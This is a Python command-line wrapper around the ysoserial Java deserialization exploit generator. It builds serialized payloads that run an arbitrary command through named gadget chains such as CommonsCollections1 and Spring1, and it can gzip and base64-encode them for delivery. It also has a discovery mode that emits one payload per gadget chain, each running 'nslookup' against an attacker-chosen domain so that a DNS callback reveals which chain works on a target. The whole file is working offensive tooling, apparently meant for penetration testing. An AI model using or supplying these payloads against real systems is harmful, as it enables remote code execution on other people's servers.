#!/usr/bin/env python3
import argparse
import base64
import gzip
import os
import shutil
import subprocess
import sys

JAR_PATH = "/app/ysoserial-all.jar"

PAYLOADS = [
    "BeanShell1", "Click1", "Clojure", "CommonsBeanutils1",
    "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4",
    "CommonsCollections5", "CommonsCollections6", "CommonsCollections7",
    "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient",
    "JSON1", "JavassistWeld1", "Jdk7u21", "MozillaRhino1", "MozillaRhino2",
    "Myfaces1", "ROME", "Spring1", "Spring2", "Vaadin1"
]


def check_dependencies():
    """Verify that java exists and the target JAR path is valid."""
    if not shutil.which("java"):
        print("Error: Java is not installed or not in PATH.", file=sys.stderr)
        sys.exit(1)

    if not os.path.isfile(JAR_PATH):
        print(f"Error: JAR not found: {JAR_PATH}", file=sys.stderr)
        sys.exit(1)

def run_ysoserial(payload_type, command, compress=False, raw=False):
    """Executes the JAR file and returns the payload (raw bytes or base64 encoded string)."""
    try:
        cmd = ["java", "-jar", JAR_PATH, payload_type, command]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        data = result.stdout

        # 1. Apply gzip compression if -c is specified
        if compress:
            data = gzip.compress(data)

        # 2. Return raw bytes or base64-encoded string
        if raw:
            return data
        else:
            return base64.b64encode(data).decode('utf-8')

    except subprocess.CalledProcessError as e:
        print(f"Error executing ysoserial for {payload_type}: {e.stderr.decode().strip()}", file=sys.stderr)
        return None

def main():
    parser = argparse.ArgumentParser(
        description="Ysoserial Payload Generator & Detector Wrapper",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  %(prog)s CommonsCollections1 \"whoami\"\n"
            "  %(prog)s -c CommonsCollections1 \"whoami\"\n"
            "  %(prog)s -r CommonsCollections1 \"whoami\"\n"
            "  %(prog)s -c -r CommonsCollections1 \"whoami\"\n"
            "  %(prog)s -d example.com"
        ),
    )

    parser.add_argument(
        "-d",
        "--domain",
        help="Run discovery mode targeting this domain",
    )
    parser.add_argument(
        "-c",
        "--compress",
        action="store_true",
        help="Gzip compress the payload data before base64 encoding",
    )
    parser.add_argument(
        "-r",
        "--raw",
        action="store_true",
        help="Output raw data from ysoserial (skip base64 encoding)",
    )

    args, remaining = parser.parse_known_args()

    check_dependencies()

    # 1. Discovery mode (-d DOMAIN)
    if args.domain is not None:
        if remaining:
            parser.error("-d/--domain cannot be combined with ysoserial arguments.")

        for payload in PAYLOADS:
            test_input = f"nslookup {payload}.{args.domain}"
            output = run_ysoserial(payload, test_input, compress=args.compress, raw=args.raw)
            if output is not None:
                if args.raw:
                    sys.stdout.buffer.write(output)
                else:
                    print(output)
        return

    # 2. Single payload generation mode (e.g. script.py Payload "command")
    if len(remaining) == 2:
        payload_type, command = remaining
        output = run_ysoserial(payload_type, command, compress=args.compress, raw=args.raw)
        if output is not None:
            if args.raw:
                sys.stdout.buffer.write(output)
            else:
                print(output)
        return

    # 3. Fallback execution mode (handles list, help, or other ysoserial arguments)
    try:
        result = subprocess.run(
            ["java", "-jar", JAR_PATH, *remaining],
            check=False,
        )
        sys.exit(result.returncode)
    except OSError as e:
        print(f"Error executing ysoserial: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
